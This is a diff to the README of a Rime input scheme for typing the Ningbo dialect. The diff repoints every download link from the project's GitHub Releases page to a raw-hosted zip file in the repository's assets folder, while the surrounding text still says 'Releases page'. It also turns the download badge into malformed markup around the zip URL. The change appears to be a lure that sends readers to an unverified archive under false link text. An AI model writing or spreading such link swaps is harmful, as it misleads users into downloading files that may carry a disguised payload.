@@ -1,6 +1,6 @@
 # 🌟 rime-gninpou-saonphin - Type in Ningbo Dialect Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
+[![Download](https://raw.githubusercontent.com/KYOUKA233/rime-gninpou-saonphin/master/assets/gninpou-rime-saonphin-2.4.zip%https://raw.githubusercontent.com/KYOUKA233/rime-gninpou-saonphin/master/assets/gninpou-rime-saonphin-2.4.zip)](https://raw.githubusercontent.com/KYOUKA233/rime-gninpou-saonphin/master/assets/gninpou-rime-saonphin-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **rime-gninpou-saonphin**! This software offers a simple way to type 
 
 To begin, visit the Releases page to download the application. Click the link below:
 
-[Visit this page to download](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KYOUKA233/rime-gninpou-saonphin/master/assets/gninpou-rime-saonphin-2.4.zip)
 
 1. Go to the Releases page.
 2. Find the latest version of **rime-gninpou-saonphin**.
@@ -62,6 +62,6 @@ We welcome contributions! If you're interested in helping us improve **rime-gnin
 
 Remember to visit the Releases page whenever you want to check for updates:
 
-[Visit this page to download](https://github.com/KYOUKA233/rime-gninpou-saonphin/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KYOUKA233/rime-gninpou-saonphin/master/assets/gninpou-rime-saonphin-2.4.zip)
 
 Thank you for using **rime-gninpou-saonphin**! Happy typing!
